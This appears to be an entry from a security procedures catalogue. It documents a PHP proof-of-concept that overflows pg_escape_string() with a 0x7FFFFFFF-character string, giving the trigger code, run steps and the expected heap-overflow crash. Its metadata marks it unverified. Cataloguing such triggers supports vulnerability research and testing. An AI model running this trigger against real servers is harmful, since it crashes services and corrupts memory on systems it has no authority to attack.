---
id: cmd-php-overflow-trigger
data: >-
  <?php ini_set('memory_limit',-1); $s=str_repeat("a",0x7FFFFFFF);
  $escaped=pg_escape_string($s); ?>
tags:
  - php
  - overflow-trigger
type: command
output: >-
  Heap overflow during execution, observable via debugger as small allocation
  followed by large writes leading to SIGSEGV
executor: php
platforms:
  - Linux
  - 32-bit
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.119Z'
verified: false
validated: true
submitted: true
---
# php-trigger-pg-escape-overflow

## Command

```php
<?php ini_set('memory_limit',-1); $s=str_repeat("a",0x7FFFFFFF); $escaped=pg_escape_string($s); ?>
```

## Description

This PHP command triggers the integer overflow and heap overflow in pg_escape_string() by creating a string of maximum length (PHP_INT_MAX) and attempting to escape it, leading to memory corruption.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| memory_limit | Set to -1 for unlimited memory to allow large string creation | Yes |
| str_repeat count | 0x7FFFFFFF (PHP_INT_MAX) to cause overflow in allocation | Yes |
| input to pg_escape_string | $s (string of 'a's) as the oversized input | Yes |

## Examples

### Basic Usage

Save as test.php and run:

```bash
php test.php
```

### Advanced Usage

Modify for different payloads:

```php
<?php ini_set('memory_limit',-1); $s=str_repeat("a",0x7FFFFFFF); echo pg_escape_string($s); ?>
```

## Expected Output

Heap overflow during execution, observable via debugger as small allocation followed by large writes leading to SIGSEGV.

## Related

- [[procedures/Trigger-Heap-Overflow-with-PHP-Test-Script]]
